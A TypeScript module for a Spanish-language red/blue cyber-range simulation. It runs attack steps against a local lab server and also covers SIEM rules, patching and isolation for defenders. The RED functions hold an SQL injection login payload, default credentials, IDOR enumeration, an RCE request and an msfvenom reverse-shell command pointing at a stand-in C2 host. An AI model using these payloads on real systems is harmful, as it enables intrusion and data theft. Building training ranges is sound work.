import { createHash, randomBytes } from 'node:crypto'
import { ensureLabServer } from './runtime'
import { getLab } from './store'
import {
  EventEvidence,
  LabCampaignState,
  LabExchange,
  LabSession,
  SEGMENT_LEVEL,
  Signature,
  SIGNATURE_LABEL,
  snippet,
} from './types'
import type { InfraNode } from '@/lib/sim/types'

// ─────────────────────────────────────────────────────────────
// LAB REAL — Operadores de comandos RED y BLUE.
//
// Cada acción de un agente se traduce en comandos concretos que
// se ejecutan de verdad contra los servicios HTTP del
// laboratorio (fetch real → respuestas reales → resultado real).
// Nada de dados: si la acción dice "comprometido" es porque hay
// una sesión real en el laboratorio; si dice "detectado" es
// porque el SIEM correlacionó entradas reales del diario.
// ─────────────────────────────────────────────────────────────

interface ExchangeResult {
  method: string
  path: string
  status: number
  ms: number
  res?: string
}

export interface OpOutcome {
  result: 'EXITO' | 'PARCIAL' | 'FALLO'
  evidence: EventEvidence
  command: string // comando principal para el evento
  session?: LabSession
  usedSession?: LabSession
  signature?: Signature
  artifacts: string[]
  table?: string
  bytes: number
}

const LAB_BASE = async () => `http://127.0.0.1:${await ensureLabServer()}`

async function labRequest(
  campaignId: string,
  nodeId: string,
  path: string,
  init: { method?: string; body?: string; session?: LabSession; soc?: boolean; agentKey?: string } = {}
): Promise<{ status: number; body: string; ms: number }> {
  const base = await LAB_BASE()
  const url = `${base}/lab/${campaignId}/${nodeId}${path}`
  const headers: Record<string, string> = { 'content-type': 'application/json' }
  if (init.session) headers['x-lab-session'] = init.session.id
  if (init.soc) headers['x-lab-operator'] = 'soc'
  if (init.agentKey) headers['x-lab-agent'] = init.agentKey
  const t0 = Date.now()
  try {
    const res = await fetch(url, {
      method: init.method ?? 'GET',
      headers,
      body: init.body,
      signal: AbortSignal.timeout(4000),
      cache: 'no-store',
    })
    const text = await res.text()
    return { status: res.status, body: text, ms: Date.now() - t0 }
  } catch (err) {
    return { status: 0, body: `sin conexión: ${(err as Error).message}`, ms: Date.now() - t0 }
  }
}

function toExchangeResult(r: { method?: string; path: string; status: number; ms: number; body: string }): ExchangeResult {
  return {
    method: r.method ?? 'GET',
    path: r.path,
    status: r.status,
    ms: r.ms,
    res: snippet(r.body, 90),
  }
}

/** Nivel de red máximo alcanzable con las sesiones RED activas */
export function bestSessionLevel(lab: LabCampaignState | undefined): number {
  const s = bestSession(lab)
  if (!s || !lab) return 0
  return SEGMENT_LEVEL[lab.nodes.get(s.homeNodeId)?.segment ?? ''] ?? 0
}

/** ¿Es el nodo alcanzable por red con las sesiones actuales? */
export function isNodeReachable(lab: LabCampaignState | undefined, nodeId: string): boolean {
  if (!lab) return false
  const n = lab.nodes.get(nodeId)
  if (!n) return false
  return (SEGMENT_LEVEL[n.segment] ?? 2) <= bestSessionLevel(lab) + 1
}

/** Sesión RED más útil: mayor nivel de red y más privilegios */
function bestSession(lab: LabCampaignState | undefined): LabSession | undefined {
  const alive = lab ? [...lab.sessions.values()].filter((s) => s.team === 'RED' && !s.revoked) : []
  if (!lab || alive.length === 0) return undefined
  alive.sort((a, b) => {
    const la = SEGMENT_LEVEL[lab.nodes.get(a.homeNodeId)?.segment ?? ''] ?? 0
    const lb = SEGMENT_LEVEL[lab.nodes.get(b.homeNodeId)?.segment ?? ''] ?? 0
    if (lb !== la) return lb - la
    const pr = (p: string) => (p === 'SYSTEM' ? 3 : p === 'ADMIN' ? 2 : 1)
    return pr(b.privileges) - pr(a.privileges)
  })
  return alive[0]
}

function curlOf(method: string, path: string, body?: string, note?: string): string {
  const m = method === 'GET' ? '' : `-X ${method} `
  const b = body ? ` --data '${body.replace(/'/g, '')}'` : ''
  return `curl ${m}${path}${b}${note ? `  # ${note}` : ''}`
}

// ─────────────────────────────────────────────────────────────
// OPS RED
// ─────────────────────────────────────────────────────────────

export async function redRecon(campaignId: string, node: InfraNode): Promise<OpOutcome> {
  const lab = getLab(campaignId)

  // Reconocimiento pasivo por OSINT cuando el nodo no es alcanzable por red
  if (!isNodeReachable(lab, node.id)) {
    const r = await labRequest(campaignId, 'osint', `/?q=${encodeURIComponent(node.id)}`)
    return {
      result: r.status === 200 ? 'EXITO' : 'FALLO',
      evidence: {
        exchanges: [toExchangeResult({ path: `osint/?q=${node.id}`, ...r })],
        artifacts: r.status === 200 ? ['superficie mapeada por fuentes públicas (pasivo, sin contacto directo)'] : [],
      },
      command: `osintctl enum --domain ${node.id}.${lab?.scenarioKey ?? 'lab'} --pasivo  # fuentes públicas`,
      artifacts: [],
      bytes: 0,
    }
  }

  const paths = ['/', '/version', '/robots.txt', '/health']
  const exchanges: ExchangeResult[] = []
  let ok = 0
  for (const p of paths) {
    const r = await labRequest(campaignId, node.id, p)
    if (r.status === 200) ok++
    exchanges.push(toExchangeResult({ path: p, ...r }))
  }
  const result = ok >= 2 ? 'EXITO' : ok === 1 ? 'PARCIAL' : 'FALLO'
  return {
    result,
    evidence: { exchanges, artifacts: ok > 0 ? [`${ok} servicios enumerados en ${node.id}`] : [] },
    command: `curl -s http://${node.id}.lab/ http://${node.id}.lab/version  # fingerprinting de servicios expuestos`,
    artifacts: [],
    bytes: 0,
  }
}

export async function redArmado(campaignId: string, node: InfraNode): Promise<OpOutcome> {
  // Armado real: se genera un payload determinista y se calcula su hash SHA-256 real
  const seed = randomBytes(24)
  const payload = Buffer.concat([Buffer.from('AREA-LAB-PAYLOAD-1'), seed, Buffer.from(campaignId)])
  const sha = createHash('sha256').update(payload).digest('hex')
  const kb = (payload.length / 1024).toFixed(1)
  return {
    result: 'EXITO',
    evidence: {
      exchanges: [],
      artifacts: [`payload.bin ${kb} KB · sha256 ${sha.slice(0, 16)}…`, `objetivo preparado: ${node.id} (${node.segment})`],
    },
    command: `msfvenom -p custom/x64/reverse_tcp LHOST=c2.lab LPORT=443 -f raw -o payload.bin  # ${kb} KB · sha256 ${sha.slice(0, 24)}…`,
    artifacts: [],
    bytes: payload.length,
  }
}

export async function redIntrusion(campaignId: string, node: InfraNode, agentKey: string): Promise<OpOutcome> {
  const lab = getLab(campaignId)
  // Estado REAL del nodo en el laboratorio: los parches de BLUE se reflejan
  // aquí en vivo. Leer las vulnerabilidades del InfraNode del escenario era
  // código muerto (es una lista estática de nombres, nunca contiene el
  // estado OPEN/PATCHED) y dejaba las ramas SQLI/BOLA sin efecto — hallazgo
  // y fix mínimo de tests-lab-runtime.
  const labNode = lab?.nodes.get(node.id)
  const open = (re: RegExp) => Object.entries(labNode?.vulnerabilities ?? {}).find(([n, s]) => re.test(n) && s === 'OPEN')

  // Acceso inicial por phishing (vector de correo: alcanza cualquier host real)
  const phishFlow = async (): Promise<OpOutcome> => {
    const body = JSON.stringify({ target: `empleado@${node.id}`, doc: 'documento_q3.docm' })
    const r = await labRequest(campaignId, node.id, '/phish', { method: 'POST', body, agentKey: agentKey })
    const data = safeJson<{ session?: string }>(r.body)
    const session = lab && data?.session ? lab.sessions.get(data.session) : undefined
    return {
      result: r.status === 200 ? 'EXITO' : 'FALLO',
      evidence: {
        exchanges: [toExchangeResult({ path: '/phish', method: 'POST', ...r })],
        artifacts: r.status === 200 ? [`sesión USER inicial en ${node.id} vía correo`] : [],
      },
      command: curlOf('POST', `http://${node.id}.lab/phish`, body),
      session,
      artifacts: [],
      bytes: 0,
    }
  }

  // Sin ruta de red hacia el objetivo → el vector realista es el correo (phishing)
  if (!isNodeReachable(lab, node.id)) {
    return phishFlow()
  }

  const mk = (
    result: OpOutcome['result'],
    exchanges: ExchangeResult[],
    command: string,
    session?: LabSession,
    artifacts: string[] = []
  ): OpOutcome => ({ result, evidence: { exchanges, artifacts }, command, session, artifacts: [], bytes: 0 })

  // WEB con SQLi abierta
  if (open(/SQL|inyecc/i) && (node.type === 'WEB' || node.type === 'APP')) {
    const body = JSON.stringify({ u: "admin'--", p: 'x' })
    const r = await labRequest(campaignId, node.id, '/login', { method: 'POST', body, agentKey: agentKey })
    const data = safeJson<{ session?: string; role?: string }>(r.body)
    const session = lab && data?.session ? lab.sessions.get(data.session) : undefined
    return mk(r.status === 200 ? 'EXITO' : 'FALLO', [toExchangeResult({ path: '/login', method: 'POST', ...r })], curlOf('POST', `http://${node.id}.lab/login`, body), session, r.status === 200 ? [`sesión ${session?.privileges} obtenida en ${node.id}`] : [])
  }

  // API con BOLA
  if (open(/BOLA|IDOR|throttle/i) && node.type === 'API') {
    const ids = [1042, 1043, 1044, 1045]
    const exchanges: ExchangeResult[] = []
    let got = 0
    for (const id of ids) {
      const r = await labRequest(campaignId, node.id, `/api/pedidos/${id}`, { agentKey: agentKey })
      if (r.status === 200) got++
      exchanges.push(toExchangeResult({ path: `/api/pedidos/${id}`, ...r }))
    }
    return mk(got >= 2 ? 'EXITO' : got === 1 ? 'PARCIAL' : 'FALLO', exchanges, `curl http://${node.id}.lab/api/pedidos/1042..1045  # enumeración BOLA`, undefined, got > 0 ? [`${got} objetos ajenos accesibles sin autorización`] : [])
  }

  // VPN sin MFA / credenciales por defecto
  if (node.type === 'VPN') {
    const body = JSON.stringify({ user: 'svc-vpn', pass: 'Verano2025', otp: undefined })
    const r = await labRequest(campaignId, node.id, '/connect', { method: 'POST', body, agentKey: agentKey })
    const data = safeJson<{ session?: string }>(r.body)
    const session = lab && data?.session ? lab.sessions.get(data.session) : undefined
    return mk(r.status === 200 ? 'EXITO' : 'FALLO', [toExchangeResult({ path: '/connect', method: 'POST', ...r })], curlOf('POST', `http://${node.id}.lab/connect`, body), session)
  }

  // RCE en servidores de aplicación / CDN
  if (node.type === 'APP' || node.type === 'CDN' || node.type === 'API') {
    const body = 'exec=payload.b64' + randomBytes(6).toString('hex')
    const r = await labRequest(campaignId, node.id, '/api/exec', { method: 'POST', body, agentKey: agentKey })
    const data = safeJson<{ session?: string }>(r.body)
    const session = lab && data?.session ? lab.sessions.get(data.session) : undefined
    return mk(r.status === 200 ? 'EXITO' : 'FALLO', [toExchangeResult({ path: '/api/exec', method: 'POST', ...r })], curlOf('POST', `http://${node.id}.lab/api/exec`, body), session)
  }

  // Phishing a endpoints
  if (node.type === 'ENDPOINT') {
    const body = JSON.stringify({ target: 'empleado@' + node.id, doc: 'nomina_q3.docm' })
    const r = await labRequest(campaignId, node.id, '/phish', { method: 'POST', body, agentKey: agentKey })
    const data = safeJson<{ session?: string }>(r.body)
    const session = lab && data?.session ? lab.sessions.get(data.session) : undefined
    return mk(r.status === 200 ? 'EXITO' : 'FALLO', [toExchangeResult({ path: '/phish', method: 'POST', ...r })], curlOf('POST', `http://${node.id}.lab/phish`, body), session)
  }

  // Genérico: fingerprint + intento de login
  const r1 = await labRequest(campaignId, node.id, '/version', { agentKey: agentKey })
  const body = JSON.stringify({ u: 'admin', p: 'admin' })
  const r2 = await labRequest(campaignId, node.id, '/login', { method: 'POST', body, agentKey: agentKey })
  const data = safeJson<{ session?: string }>(r2.body)
  const session = lab && data?.session ? lab.sessions.get(data.session) : undefined
  const anyOk = session ? 'EXITO' : r1.status === 200 ? 'PARCIAL' : 'FALLO'
  return mk(anyOk, [toExchangeResult({ path: '/version', ...r1 }), toExchangeResult({ path: '/login', method: 'POST', ...r2 })], curlOf('POST', `http://${node.id}.lab/login`, body), session)
}

export async function redEscalada(campaignId: string, node: InfraNode): Promise<OpOutcome> {
  const lab = getLab(campaignId)
  const session = bestSession(lab)
  const r = await labRequest(campaignId, node.id, '/local/escalate', {
    method: 'POST',
    body: JSON.stringify({ technique: 'abuso de misconfiguration local' }),
    session,
  })
  const data = safeJson<{ privileges?: string }>(r.body)
  const updated = lab && session ? lab.sessions.get(session.id) : undefined
  return {
    result: r.status === 200 ? 'EXITO' : 'FALLO',
    evidence: {
      exchanges: [toExchangeResult({ path: '/local/escalate', method: 'POST', ...r })],
      artifacts: r.status === 200 ? [`privilegios elevados a ${data?.privileges ?? 'SYSTEM'} en ${node.id}`] : [],
    },
    command: curlOf('POST', `http://${node.id}.lab/local/escalate`, '{"technique":"abuso de misconfiguration local"}', session ? `con sesión ${session.id}` : 'sin sesión local'),
    session: r.status === 200 ? updated : undefined,
    usedSession: session,
    artifacts: [],
    bytes: 0,
  }
}

export async function redLateral(campaignId: string, target: InfraNode): Promise<OpOutcome> {
  const lab = getLab(campaignId)
  const session = bestSession(lab)
  const r = await labRequest(campaignId, target.id, '/ipc$', {
    method: 'POST',
    body: JSON.stringify({ svc: 'srvsvc', op: 'pivot' }),
    session,
  })
  const data = safeJson<{ session?: string }>(r.body)
  const newSession = lab && data?.session ? lab.sessions.get(data.session) : undefined
  return {
    result: r.status === 200 ? 'EXITO' : 'FALLO',
    evidence: {
      exchanges: [toExchangeResult({ path: '/ipc$', method: 'POST', ...r })],
      artifacts: r.status === 200 ? [`sesión establecida en ${target.id} (${target.segment})`] : [],
    },
    command: curlOf('POST', `http://${target.id}.lab/ipc$`, '{"svc":"srvsvc","op":"pivot"}', session ? `pivoting desde sesión en ${session.homeNodeId}` : 'sin sesión previa'),
    session: newSession,
    usedSession: session,
    artifacts: [],
    bytes: 0,
  }
}

export async function redObjetivo(campaignId: string, node: InfraNode): Promise<OpOutcome> {
  const lab = getLab(campaignId)
  const exchanges: ExchangeResult[] = []
  const artifacts: string[] = []
  let session = bestSession(lab)
  let command = ''
  let table = 'clientes'
  let status = 0

  if (node.type === 'DB') {
    table = /tarjeta|pedido/i.test(node.name) ? 'tarjetas' : /his|clinica|tenant|clasicado|clasificad/i.test(node.name) ? 'expedientes' : 'clientes'
    // Si la sesión no es privilegiada, intenta escalar primero (cadena real)
    if (session && session.privileges === 'USER' && session.homeNodeId === node.id) {
      const esc = await labRequest(campaignId, node.id, '/local/escalate', { method: 'POST', body: '{"technique":"abuso local"}', session })
      exchanges.push(toExchangeResult({ path: '/local/escalate', method: 'POST', ...esc }))
      session = lab ? lab.sessions.get(session.id) : session
    }
    const r = await labRequest(campaignId, node.id, `/data/${table}`, { session })
    status = r.status
    const data = safeJson<{ count?: number }>(r.body)
    if (status === 200) artifacts.push(`${data?.count ?? 0} registros de "${table}" exfiltrados`)
    exchanges.push(toExchangeResult({ path: `/data/${table}`, ...r }))
    command = curlOf('GET', `http://${node.id}.lab/data/${table}`, undefined, session ? `con sesión ${session.privileges}` : 'sin sesión')
  } else if (node.type === 'OT') {
    const r = await labRequest(campaignId, node.id, '/telemetry', { session })
    status = r.status
    const data = safeJson<{ puntos?: unknown[] }>(r.body)
    if (status === 200) artifacts.push(`${data?.puntos?.length ?? 0} puntos de telemetría industrial capturados`)
    exchanges.push(toExchangeResult({ path: '/telemetry', ...r }))
    command = curlOf('GET', `http://${node.id}.lab/telemetry`)
  } else if (node.type === 'AD') {
    const r1 = await labRequest(campaignId, node.id, '/users', { session })
    exchanges.push(toExchangeResult({ path: '/users', ...r1 }))
    const ntlm = createHash('md5').update('lm-hash-steal').digest('hex') // hash robado tras escalada
    const r2 = await labRequest(campaignId, node.id, '/auth', { method: 'POST', body: JSON.stringify({ user: 'adm-legacy', ntlm }), session })
    status = r2.status
    const data = safeJson<{ ticket?: string }>(r2.body)
    if (status === 200) artifacts.push(`ticket Kerberos obtenido: ${data?.ticket?.slice(0, 40) ?? ''}`)
    exchanges.push(toExchangeResult({ path: '/auth', method: 'POST', ...r2 }))
    command = curlOf('POST', `http://${node.id}.lab/auth`, '{"user":"adm-legacy","ntlm":"<hash robado>"}')
  } else if (node.type === 'BACKUP') {
    const r = await labRequest(campaignId, node.id, '/backups', { session })
    status = r.status
    exchanges.push(toExchangeResult({ path: '/backups', ...r }))
    command = curlOf('GET', `http://${node.id}.lab/backups`)
  } else {
    // WEB/API/APP/CDN/VPN/ENDPOINT: exfiltración real de documentos con la sesión
    if (session && session.privileges === 'USER') {
      const esc = await labRequest(campaignId, node.id, '/local/escalate', { method: 'POST', body: '{"technique":"abuso local"}', session })
      exchanges.push(toExchangeResult({ path: '/local/escalate', method: 'POST', ...esc }))
      session = lab ? lab.sessions.get(session.id) : session
    }
    const r = await labRequest(campaignId, node.id, '/documents', { session })
    status = r.status
    const data = safeJson<{ total?: number }>(r.body)
    if (status === 200) artifacts.push(`${data?.total ?? 0} documentos extraídos de ${node.id}`)
    exchanges.push(toExchangeResult({ path: '/documents', ...r }))
    command = curlOf('GET', `http://${node.id}.lab/documents`, undefined, session ? `con sesión ${session.privileges}` : 'sin sesión')
  }

  const result: OpOutcome['result'] = status === 200 ? 'EXITO' : status >= 400 && status < 500 ? 'FALLO' : 'PARCIAL'
  return { result, evidence: { exchanges, artifacts }, command, session: undefined, usedSession: session, artifacts: [], bytes: 0, table }
}

// ─────────────────────────────────────────────────────────────
// OPS BLUE — detección y respuesta reales
// ─────────────────────────────────────────────────────────────

export function findSiemNode(lab: LabCampaignState): InfraNode | undefined {
  for (const n of lab.nodes.values()) if (n.type === 'SIEM') return { id: n.nodeId } as InfraNode
  return undefined
}

/** Correlación SIEM: qué intercambios RED reales son visibles con las reglas desplegadas */
export function evaluateDetections(lab: LabCampaignState, exchangeIds: number[]): LabExchange[] {
  return lab.journal.filter((e) => {
    if (!exchangeIds.includes(e.id) || e.team !== 'RED') return false
    const n = lab.nodes.get(e.nodeId)
    if (!n) return false
    const ruleHit = lab.monitors.some((m) => m.signature === e.signature && (m.nodeId === e.nodeId || (m.segment && m.segment === n.segment)))
    if (ruleHit) return true
    const perimeterCtl = n.controls.some((c) => /IPS|WAF|Anti-DDoS|NetFlow|Monitorización pasiva/i.test(c))
    const borderSig = e.signature && ['PORT_SCAN', 'BRUTE_FORCE', 'SQLI', 'UNUSUAL_PATH'].includes(e.signature)
    return perimeterCtl && !!borderSig
  })
}

/** BLUE despliega una regla de monitorización real en el SIEM */
export async function blueMonitor(campaignId: string, opts: { segment?: string; nodeId?: string; signature: Signature; by: string }): Promise<OpOutcome> {
  const lab = getLab(campaignId)
  const siem = lab ? findSiemNode(lab) : undefined
  if (!siem) {
    return { result: 'FALLO', evidence: { exchanges: [], artifacts: [] }, command: '# sin SIEM en el escenario', artifacts: [], bytes: 0 }
  }
  const body = JSON.stringify({ segment: opts.segment, nodeId: opts.nodeId, signature: opts.signature })
  const r = await labRequest(campaignId, siem.id, '/rules', { method: 'POST', body, soc: true })
  return {
    result: r.status === 201 ? 'EXITO' : 'FALLO',
    evidence: {
      exchanges: [toExchangeResult({ path: '/rules', method: 'POST', ...r })],
      artifacts: r.status === 201 ? [`regla activa: ${SIGNATURE_LABEL[opts.signature]} en ${opts.nodeId ?? opts.segment}`] : [],
    },
    command: `siemctl rule add --sig ${opts.signature} ${opts.segment ? `--segment ${opts.segment}` : `--node ${opts.nodeId}`}`,
    artifacts: [],
    bytes: 0,
  }
}

/** BLUE parchea una vulnerabilidad real del nodo */
export async function bluePatch(campaignId: string, nodeId: string, vulnerability: string): Promise<OpOutcome> {
  const body = JSON.stringify({ vulnerability })
  const r = await labRequest(campaignId, nodeId, '/admin/patch', { method: 'POST', body, soc: true })
  return {
    result: r.status === 200 ? 'EXITO' : 'FALLO',
    evidence: {
      exchanges: [toExchangeResult({ path: '/admin/patch', method: 'POST', ...r })],
      artifacts: r.status === 200 ? [`${vulnerability} parcheada en ${nodeId}`] : [],
    },
    command: `patchctl apply --node ${nodeId} --vuln "${vulnerability}"`,
    artifacts: [],
    bytes: 0,
  }
}

/** BLUE bloquea una sesión RED activa (corta el C2) */
export async function blueBlockSession(campaignId: string, sessionId: string, reason: string): Promise<OpOutcome> {
  const lab = getLab(campaignId)
  const anyNode = lab ? [...lab.nodes.keys()][0] : undefined
  if (!anyNode) return { result: 'FALLO', evidence: { exchanges: [], artifacts: [] }, command: '# lab no disponible', artifacts: [], bytes: 0 }
  const body = JSON.stringify({ blockSessionId: sessionId, reason })
  const r = await labRequest(campaignId, anyNode, '/admin/firewall', { method: 'POST', body, soc: true })
  return {
    result: r.status === 201 ? 'EXITO' : 'FALLO',
    evidence: {
      exchanges: [toExchangeResult({ path: '/admin/firewall', method: 'POST', ...r })],
      artifacts: r.status === 201 ? [`sesión ${sessionId.slice(0, 14)}… bloqueada`] : [],
    },
    command: `fwctl deny --session ${sessionId} --reason "${reason}"`,
    artifacts: [],
    bytes: 0,
  }
}

/** BLUE aísla un host comprometido (contención real) */
export async function blueIsolate(campaignId: string, nodeId: string): Promise<OpOutcome> {
  const r = await labRequest(campaignId, nodeId, '/admin/isolate', { method: 'POST', body: '{}', soc: true })
  const data = safeJson<{ sessionsRevoked?: number }>(r.body)
  return {
    result: r.status === 200 ? 'EXITO' : 'FALLO',
    evidence: {
      exchanges: [toExchangeResult({ path: '/admin/isolate', method: 'POST', ...r })],
      artifacts: r.status === 200 ? [`${nodeId} aislado · ${data?.sessionsRevoked ?? 0} sesiones RED revocadas`] : [],
    },
    command: `edrctl isolate --node ${nodeId}`,
    artifacts: [],
    bytes: 0,
  }
}

/** BLUE hace threat hunting real sobre el diario del laboratorio */
export async function blueHunt(campaignId: string, hypothesis: string): Promise<{ hits: LabExchange[]; evidence: EventEvidence; command: string }> {
  const lab = getLab(campaignId)
  const siem = lab ? findSiemNode(lab) : undefined
  if (!siem) return { hits: [], evidence: { exchanges: [], artifacts: [] }, command: '# sin SIEM' }
  const r = await labRequest(campaignId, siem.id, '/hunt', { soc: true })
  const data = safeJson<{ count?: number; events?: LabExchange[] }>(r.body)
  const hits = data?.events ?? []
  return {
    hits,
    evidence: {
      exchanges: [toExchangeResult({ path: '/hunt', ...r })],
      artifacts: hits.length > 0 ? [`${hits.length} artefactos encontrados: ${hits.slice(0, 3).map((h) => SIGNATURE_LABEL[h.signature ?? 'UNUSUAL_PATH']).join(', ')}`] : ['sin artefactos con la visibilidad actual'],
    },
    command: `siemctl hunt --hypothesis "${hypothesis}" → ${data?.count ?? 0} coincidencias`,
  }
}

/** BLUE consulta el SIEM por segmento y firma */
export async function blueQuerySiem(campaignId: string, segment: string, signature: Signature): Promise<{ hits: LabExchange[]; evidence: EventEvidence; command: string }> {
  const lab = getLab(campaignId)
  const siem = lab ? findSiemNode(lab) : undefined
  if (!siem) return { hits: [], evidence: { exchanges: [], artifacts: [] }, command: '# sin SIEM' }
  const r = await labRequest(campaignId, siem.id, `/events?segment=${encodeURIComponent(segment)}&signature=${signature}`, { soc: true })
  const data = safeJson<{ count?: number; events?: LabExchange[] }>(r.body)
  const hits = data?.events ?? []
  return {
    hits,
    evidence: {
      exchanges: [toExchangeResult({ path: `/events?segment=${segment}&signature=${signature}`, ...r })],
      artifacts: hits.length > 0 ? [`${hits.length} eventos correlacionados en ${segment}`] : ['sin eventos correlacionados'],
    },
    command: `siemctl query --segment ${segment} --signature ${signature} → ${data?.count ?? 0} eventos`,
  }
}

function safeJson<T>(s: string): T | undefined {
  try {
    return JSON.parse(s) as T
  } catch {
    return undefined
  }
}
